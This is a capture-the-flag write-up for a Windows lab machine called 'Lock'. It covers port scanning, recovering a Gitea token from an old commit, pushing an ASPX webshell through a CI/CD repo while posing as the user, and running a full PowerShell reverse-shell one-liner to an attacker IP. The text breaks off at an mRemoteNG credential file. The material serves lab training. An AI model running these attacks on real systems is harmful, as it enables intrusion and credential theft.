### Summary
We begin to acquire a foothold by finding an authorization token in an old commit of a gittea instance which we can use to acquire the repository for a CI/CD web application. We upload a `webshell.aspx` to the website, giving us a foothold for the user `ellen.freeman`. We find RDP credentials for the user `gale.dekarios` who has a vulnerable version of `PDF24` which we can use for local privilege escalation to a root shell

### Tools
- [[NetExec (nxc)]]
- `feroxbuster` - web directory brute-force
- `rlwrap` - QoL upgrades to windows reverse shell (arrow keys)
- `xfreerdp`

###### [[#Recon]]
- [[#Initial Scanning]]
- [[#SMB - Port 445]]
- [[#HTTP - Port 80]]
	- [[#Enumeration]]
	- [[#Directory Brute Force]]
- [[#Gitea - TCP 3000]]
	- [[#repos.py]]
###### [[#User Shell - ellen.freeman]]
- [[#Enumeration]]
	- [[#config.xml]]
	- [[#Extracting RDP Creds]]
###### [[#User Shell - gale.dekarios]]
- [[#Enumeration]]
###### [[#Root Shell]]
- [[#CVE-2023-49147]]

---
# Recon
## Initial Scanning
---
```sh
❯ sudo nmap -p- --min-rate 10000 -vvv 10.129.234.64 -oN nmap/tcp
...snip...
Completed SYN Stealth Scan at 14:24, 13.29s elapsed (65535 total ports)
Nmap scan report for 10.129.234.64
Host is up, received echo-reply ttl 127 (0.030s latency).
Scanned at 2025-12-21 14:23:59 EST for 13s
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       REASON
80/tcp   open  http          syn-ack ttl 127
445/tcp  open  microsoft-ds  syn-ack ttl 127
3000/tcp open  ppp           syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
           Raw packets sent: 131079 (5.767MB) | Rcvd: 13 (556B)
           
❯ sudo nmap -p 80,445,3000,3389 -sCV -vv 10.129.234.64 -oN nmap/scripts
Scanned at 2025-12-21 14:26:14 EST for 130s

PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
445/tcp  open  microsoft-ds? syn-ack ttl 127
3000/tcp open  ppp?          syn-ack ttl 127
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=16fe98594a019ff7; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=mRmGMDoJQd65krXGNm8fvvcIaxg6MTc2NjM0NTE4MDg2MTQ0MzIwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 21 Dec 2025 19:26:21 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href=\"data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=4ec85b8468ba0ce5; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=rxnTOLLmZqj4pHUxUdBwmptmTAs6MTc2NjM0NTE4Nzg1NTU5NzEwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sun, 21 Dec 2025 19:26:27 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
|_ssl-date: 2025-12-21T19:28:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Issuer: commonName=Lock
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-20T19:19:51
| Not valid after:  2026-06-21T19:19:51
| MD5:   2ab3 4b08 fcee d71f a4f9 0666 ae74 ceb7
| SHA-1: 006c 8c86 d6d6 b198 fd27 682a 6dbd 7185 8950 3df5
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQMRsGt4lEE6RCj77zQ2V8EjANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRMb2NrMB4XDTI1MTIyMDE5MTk1MVoXDTI2MDYyMTE5MTk1MVow
| DzENMAsGA1UEAxMETG9jazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| APZMD67CdSMZfdUplReDUrWDvb+oK3yBNOWxcFMR2NpN1/4lXOKMZhGns3vgZhR3
| DKFZvEdAhTug9TCJsnMbKvwWnyeKgNPShZ0Tt0CLMuFEMg/98zCgTZ34Ksh9+6Xg
| jTTRttJFxpAcjUcHWRlwyO6MytuyQ2PVE0UQwg9+fBbkL5xa0tSUaYeDxo1Byc04
| UZj6MDnuhqLGPfaZ9pviomQBhSKD24LnV2Y55puSaIpnT8Pgiyfm78ZnEVqPCQdm
| a+B5/uCFH+7eR9Lo1WVDxgxwkQIbFFqRFKLqATreTxloPKNdYyqJaLXLf+OnQL8f
| ia+jo9yHlYHemfKV6tV0v30CAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQCOUEkGSaUCFGBIARkVHcIc
| DWE40Jl7xaaZYyjreWmxhdXFvVLmsz/osXy/CfCZkO6Sw+yXW99/l155ncNKa7if
| YfuwHPrTKAwzBDnrU77zSB2X1ge00sIioIY6cLDZ+Lb+teWAFora6wAZdbNr/o2N
| 5eyvwct8Ha3nd7EAqe0jx2whHQYxYKyCIy+yjDuCgFrz3PgrrHDkY5TshpkzHZh4
| H+jqT0heNPio8bHK+aNLahyi417kYNRfjs8QlvV6qJ97p6nIZwb/qMHx0ro7ElGw
| /6MMEKYF6kOZP7GjOXGbe3f2OJ2GZktmrvSA4RangIGj1+wHAEiC4U4fRV8lOANi
|_-----END CERTIFICATE-----
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-21T19:27:45+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.92%I=7%D=12/21%Time=694849DC%P=x86_64-redhat-linux-gnu
SF:%r(GenericLines,67,\"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:
SF:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20
SF:Bad\x20Request")%r(GetRequest,36B8,"HTTP/1\.0\x20200\x20OK\r\nCache-Con
SF:trol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_g
SF:itea=16fe98594a019ff7;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-C
SF:ookie:\x20_csrf=mRmGMDoJQd65krXGNm8fvvcIaxg6MTc2NjM0NTE4MDg2MTQ0MzIwMA;
SF:\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-O
SF:ptions:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2021\x20Dec\x202025\x2019:26:21
SF:\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"t
SF:heme-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=d
SF:evice-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a
SF:\x20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"dat
SF:a:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mI
SF:HRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rh
SF:cnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHR
SF:wOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS
SF:9wbmciLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r
SF:\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close
SF:\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,197,"HTTP/1\.0\x20405\x20
SF:Method\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Co
SF:ntrol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\
SF:nSet-Cookie:\x20i_like_gitea=4ec85b8468ba0ce5;\x20Path=/;\x20HttpOnly;\
SF:x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=rxnTOLLmZqj4pHUxUdBwmptmTAs6MTc
SF:2NjM0NTE4Nzg1NTU5NzEwMA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20S
SF:ameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Sun,\x2021\x2
SF:0Dec\x202025\x2019:26:27\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTS
SF:PRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20tex
SF:t/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20
SF:Request\");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time:
|   date: 2025-12-21T19:27:46
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 21452/tcp): CLEAN (Timeout)
|   Check 2 (port 46369/tcp): CLEAN (Timeout)
|   Check 3 (port 45893/udp): CLEAN (Timeout)
|   Check 4 (port 7147/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:28
Completed NSE at 14:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:28
Completed NSE at 14:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:28
Completed NSE at 14:28, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 131.04 seconds
           Raw packets sent: 8 (328B) | Rcvd: 5 (204B)
```
- A few things that pop out:
	- Port 3000 sets a cookie: `i_like_gitea` so there's probably a gitea instance running, the base64 decoded href confirms this also
	- Port 445 is open so we've got some `SMB` enumeration potential
	- Port 3389 is `RDP` and shows that the hostname is `LOCK`
	- There doesn't appear to be an AD domain on this box which simplifies things a bit
- All ports have TTL `127` which is standard for Windows 1 hop away

## SMB - Port 445
---
- We can use `netexec` to try to probe for anonymous or guest logins:
```sh
❯ nxc smb LOCK -u '' -p ''
SMB         10.129.234.64   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:None)
SMB         10.129.234.64   445    LOCK             [-] Lock\: STATUS_ACCESS_DENIED 

❯ nxc smb LOCK -u guest -p ''
SMB         10.129.234.64   445    LOCK             [*] Windows Server 2022 Build 20348 (name:LOCK) (domain:Lock) (signing:False) (SMBv1:None)
SMB         10.129.234.64   445    LOCK             [-] Lock\guest: STATUS_ACCOUNT_DISABLED 
```
- No luck. Without any credentials we can't go much further from here

## HTTP - Port 80
---
### Enumeration
- We can open Burp and see what it spiders to, we quickly notice that the default page is `index.html` indicating a static site
- Other than that, it seems to be a website advertising PDF OCR
- There's bootstrap CSS files and a few javascript files but nothing especially interesting

```http
Content-Type: text/html
Last-Modified: Thu, 28 Dec 2023 14:07:59 GMT
Accept-Ranges: bytes
ETag: "675cb2439739da1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Sun, 21 Dec 2025 19:52:06 GMT
Content-Length: 16054
```
- The response headers from the root directory of the site indicate this is running `ASP.NET` and it's a `Microsoft-IIS` server

![[Pasted image 20251221145950.png]]
- The 404 page matches the [default IIS](https://0xdf.gitlab.io/cheatsheets/404#iis) so we're not being duped lol

### Directory Brute Force
- We can run `feroxbuster` to try to enumerate additional directories on the webserver. We'll use `-x html` since we know of html extensions on the page and a lowercase wordlist since `IIS` is case insensitive:
```sh
❯ feroxbuster -u http://lock -x html -w ~/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories-lowercase.txt --dont-extract-links

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.13.1
───────────────────────────┬──────────────────────
     Target Url            │ http://lock/
     In-Scope Url          │ lock
     Threads               │ 50
     Wordlist              │ /home/aldamd/ctf/TOOLS/wordlist/Discovery/Web-Content/raft-medium-directories-lowercase.txt
     Status Codes          │ All Status Codes!
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.13.1
     Extensions            │ [html]
     HTTP methods          │ [GET]
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      347l     1183w    16054c http://lock/
301      GET        2l       10w      142c http://lock/assets => http://lock/assets/
301      GET        2l       10w      146c http://lock/assets/css => http://lock/assets/css/
301      GET        2l       10w      145c http://lock/assets/js => http://lock/assets/js/
301      GET        2l       10w      146c http://lock/assets/img => http://lock/assets/img/
301      GET        2l       10w      149c http://lock/aspnet_client => http://lock/aspnet_client/
200      GET      347l     1183w    16054c http://lock/index.html
301      GET        2l       10w      154c http://lock/assets/img/clients => http://lock/assets/img/clients/
301      GET        2l       10w      156c http://lock/assets/img/portfolio => http://lock/assets/img/portfolio/
301      GET        2l       10w      159c http://lock/assets/img/testimonials => http://lock/assets/img/testimonials/
301      GET        2l       10w      149c http://lock/assets/vendor => http://lock/assets/vendor/
301      GET        2l       10w      152c http://lock/assets/img/slide => http://lock/assets/img/slide/
301      GET        2l       10w      160c http://lock/aspnet_client/system_web => http://lock/aspnet_client/system_web/
301      GET        2l       10w      153c http://lock/assets/vendor/aos => http://lock/assets/vendor/aos/
[####################] - 6m    691184/691184  0s      found:79      errors:109
[####################] - 5m     53168/53168   166/s   http://lock/
[####################] - 5m     53168/53168   166/s   http://lock/assets/
[####################] - 5m     53168/53168   163/s   http://lock/assets/css/
[####################] - 5m     53168/53168   165/s   http://lock/assets/js/
[####################] - 5m     53168/53168   165/s   http://lock/assets/img/
[####################] - 5m     53168/53168   162/s   http://lock/aspnet_client/
[####################] - 5m     53168/53168   164/s   http://lock/assets/img/clients/
[####################] - 5m     53168/53168   163/s   http://lock/assets/img/portfolio/
[####################] - 5m     53168/53168   162/s   http://lock/assets/img/testimonials/
[####################] - 5m     53168/53168   163/s   http://lock/assets/vendor/
[####################] - 5m     53168/53168   166/s   http://lock/assets/img/slide/
[####################] - 4m     53168/53168   249/s   http://lock/aspnet_client/system_web/
[####################] - 3m     53168/53168   279/s   http://lock/assets/vendor/aos/
```
- Trying to follow up any of the redirects results in a `403` - access denied, so nothing interesting here

## Gitea - TCP 3000
---
- Visiting the web application, the front page looks to be a default gitea instance
- We can `explore` and notice a single accessible respository, `ellen.freeman`'s `dev-scripts`
![[Pasted image 20251221153413.png]]
### repos.py
```python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)
	
    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)
	
    gitea_domain = format_domain(sys.argv[1])
	
    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)
	
    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```
- This appears to be a python script that fetches repo information
- If we look back at the previous commit, we see:
```python
# store this in env instead at some point
PERSONAL_ACCESS_TOKEN = '43ce39bb0bd6bc489284f2905f033ca467a6362f'
```

- With this we can explore the API. Looking at Burp's spidering, we see `/api/swagger` is a potential endpoint, usually api documentation
![[Pasted image 20251221154055.png]]

- We can authorize with the acquired `PERSONAL_ACCES_TOKEN` `43ce39bb0bd6bc489284f2905f033ca467a6362f` but we quickly notice we don't have access to the `admin` properties of the api
- We can perform a `repos/search` general query to get more repositories:
```json
{
  "ok": true,
  "data": [
    {
      "id": 1,
      "owner": {
        "id": 2,
        "login": "ellen.freeman",
        "login_name": "",
        "full_name": "",
        "email": "ellen.freeman@lock.vl",
        "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
        "language": "",
        "is_admin": false,
        "last_login": "0001-01-01T00:00:00Z",
        "created": "2023-12-27T11:13:10-08:00",
        "restricted": false,
        "active": false,
        "prohibit_login": false,
        "location": "",
        "website": "",
        "description": "",
        "visibility": "public",
        "followers_count": 0,
        "following_count": 0,
        "starred_repos_count": 0,
        "username": "ellen.freeman"
      },
      "name": "dev-scripts",
      "full_name": "ellen.freeman/dev-scripts",
      "description": "",
      "empty": false,
      "private": false,
      "fork": false,
      "template": false,
      "parent": null,
      "mirror": false,
      "size": 29,
      "language": "Python",
      "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts/languages",
      "html_url": "http://localhost:3000/ellen.freeman/dev-scripts",
      "url": "http://localhost:3000/api/v1/repos/ellen.freeman/dev-scripts",
      "link": "",
      "ssh_url": "ellen.freeman@localhost:ellen.freeman/dev-scripts.git",
      "clone_url": "http://localhost:3000/ellen.freeman/dev-scripts.git",
      "original_url": "",
      "website": "",
      "stars_count": 0,
      "forks_count": 0,
      "watchers_count": 1,
      "open_issues_count": 0,
      "open_pr_counter": 0,
      "release_counter": 0,
      "default_branch": "main",
      "archived": false,
      "created_at": "2023-12-27T11:17:47-08:00",
      "updated_at": "2023-12-27T11:36:42-08:00",
      "archived_at": "1969-12-31T16:00:00-08:00",
      "permissions": {
        "admin": true,
        "push": true,
        "pull": true
      },
      "has_issues": true,
      "internal_tracker": {
        "enable_time_tracker": true,
        "allow_only_contributors_to_track_time": true,
        "enable_issue_dependencies": true
      },
      "has_wiki": true,
      "has_pull_requests": true,
      "has_projects": true,
      "has_releases": true,
      "has_packages": true,
      "has_actions": false,
      "ignore_whitespace_conflicts": false,
      "allow_merge_commits": true,
      "allow_rebase": true,
      "allow_rebase_explicit": true,
      "allow_squash_merge": true,
      "allow_rebase_update": true,
      "default_delete_branch_after_merge": false,
      "default_merge_style": "merge",
      "default_allow_maintainer_edit": false,
      "avatar_url": "",
      "internal": false,
      "mirror_interval": "",
      "mirror_updated": "0001-01-01T00:00:00Z",
      "repo_transfer": null
    },
    {
      "id": 5,
      "owner": {
        "id": 2,
        "login": "ellen.freeman",
        "login_name": "",
        "full_name": "",
        "email": "ellen.freeman@lock.vl",
        "avatar_url": "http://localhost:3000/avatar/1aea7e43e6bb8891439a37854255ed74",
        "language": "",
        "is_admin": false,
        "last_login": "0001-01-01T00:00:00Z",
        "created": "2023-12-27T11:13:10-08:00",
        "restricted": false,
        "active": false,
        "prohibit_login": false,
        "location": "",
        "website": "",
        "description": "",
        "visibility": "public",
        "followers_count": 0,
        "following_count": 0,
        "starred_repos_count": 0,
        "username": "ellen.freeman"
      },
      "name": "website",
      "full_name": "ellen.freeman/website",
      "description": "",
      "empty": false,
      "private": true,
      "fork": false,
      "template": false,
      "parent": null,
      "mirror": false,
      "size": 7370,
      "language": "CSS",
      "languages_url": "http://localhost:3000/api/v1/repos/ellen.freeman/website/languages",
      "html_url": "http://localhost:3000/ellen.freeman/website",
      "url": "http://localhost:3000/api/v1/repos/ellen.freeman/website",
      "link": "",
      "ssh_url": "ellen.freeman@localhost:ellen.freeman/website.git",
      "clone_url": "http://localhost:3000/ellen.freeman/website.git",
      "original_url": "",
      "website": "",
      "stars_count": 0,
      "forks_count": 0,
      "watchers_count": 1,
      "open_issues_count": 0,
      "open_pr_counter": 0,
      "release_counter": 0,
      "default_branch": "main",
      "archived": false,
      "created_at": "2023-12-27T12:04:52-08:00",
      "updated_at": "2024-01-18T10:17:46-08:00",
      "archived_at": "1969-12-31T16:00:00-08:00",
      "permissions": {
        "admin": true,
        "push": true,
        "pull": true
      },
      "has_issues": true,
      "internal_tracker": {
        "enable_time_tracker": true,
        "allow_only_contributors_to_track_time": true,
        "enable_issue_dependencies": true
      },
      "has_wiki": true,
      "has_pull_requests": true,
      "has_projects": true,
      "has_releases": true,
      "has_packages": true,
      "has_actions": false,
      "ignore_whitespace_conflicts": false,
      "allow_merge_commits": true,
      "allow_rebase": true,
      "allow_rebase_explicit": true,
      "allow_squash_merge": true,
      "allow_rebase_update": true,
      "default_delete_branch_after_merge": false,
      "default_merge_style": "merge",
      "default_allow_maintainer_edit": false,
      "avatar_url": "",
      "internal": false,
      "mirror_interval": "",
      "mirror_updated": "0001-01-01T00:00:00Z",
      "repo_transfer": null
    }
  ]
}
```
- Looks like on top of `dev-scripts` there's also `website` at `http://localhost:3000/ellen.freeman/website.git`
	- We cannot navigate to it. We could use the api to fetch the contents of the repo but i'd rather clone it
- We can clone the repository with the following:
```sh
git clone http://<authorization>@host:port/user/repo

git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@LOCK:3000/ellen.freeman/website.git
```


- Reading the contents of the repo, it looks to be the website at port 80
- If we fetch the `readme.md` of the repo:
```text
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```
- Which means we can push anything we want into the repo and it'll be integrated into the site! Let's push a nasty web shell for us
- Since we know the site is running on `asp.net`, we can [grab one online](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx) and push it
- If we wanted to be sneaky, we should change our github creds to match that of `ellen`'s:
```sh
git add webshell.aspx
git config --global user.name "ellen.freeman"
git config --global user.email "ellen.freeman"
git commit -m "hehe"
git push
```

![[Pasted image 20251221160410.png]]

- We can use the command injection utility here to enumerate powershell version:
```powershell
powershell -c "$PSVersionTable"
Name                           Value                     
----                           -----                                             
PSVersion                      5.1.20348.3932                                    
PSEdition                      Desktop                                           
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0...}                           
BuildVersion                   10.0.20348.3932                                   
CLRVersion                     4.0.30319.42000                                   
WSManStackVersion              3.0                                               
PSRemotingProtocolVersion      2.3                                               
SerializationVersion           1.1.0.1
```
- From the results, it doesn't look like it matters much which powershell version we want to spawn, so let's just do version 3

- We can give ourselves a reverse shell on this Windows system by grabbing a payload from [revshells.com](https://www.revshells.com/), specifically powershell version 3 (base64 encoded) 
	- First we need to open the firewall hehexd
```powershell
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('10.10.14.50', 9001);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```
```sh
rlwrap -cAR nc -lvnp 9001
```

# User Shell - ellen.freeman
---
## Enumeration
---
- There is no `user.txt` file here unfortunately :(
- If we look at the `Users` directory, we see an additional user:
```powershell
SHELL> ls
    Directory: C:\Users
Mode                 LastWriteTime         Length Name                           
----                 -------------         ------ ----                           
d-----        12/27/2023   2:00 PM                .NET v4.5                      
d-----        12/27/2023   2:00 PM                .NET v4.5 Classic              
d-----        12/27/2023  12:01 PM                Administrator                  
d-----        12/28/2023  11:36 AM                ellen.freeman                  
d-----        12/28/2023   6:14 AM                gale.dekarios                  
d-r---        12/27/2023  10:21 AM                Public                         
```

- Attempting to enumerate `gale.dekarios` with `tree /f .` tells us that `No subfolders exist`
- We can enumerate `ellen`'s home directory though:
```powershell
SHELL> tree /f ellen.freeman
Folder PATH listing
Volume serial number is 000001BA 8592:A9D9
C:\USERS\ELLEN.FREEMAN
ª   .git-credentials
ª   .gitconfig
ª   
+---.ssh
ª       authorized_keys
ª       
+---3D Objects
+---Contacts
+---Desktop
+---Documents
ª       config.xml
ª       
+---Downloads
+---Favorites
ª   ª   Bing.url
ª   ª   
ª   +---Links
+---Links
ª       Desktop.lnk
ª       Downloads.lnk
ª       
+---Music
+---Pictures
+---Saved Games
+---Searches
+---Videos
```
- An item of interest here is the `config.xml` file

### config.xml
```xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections
	xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
	<Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" 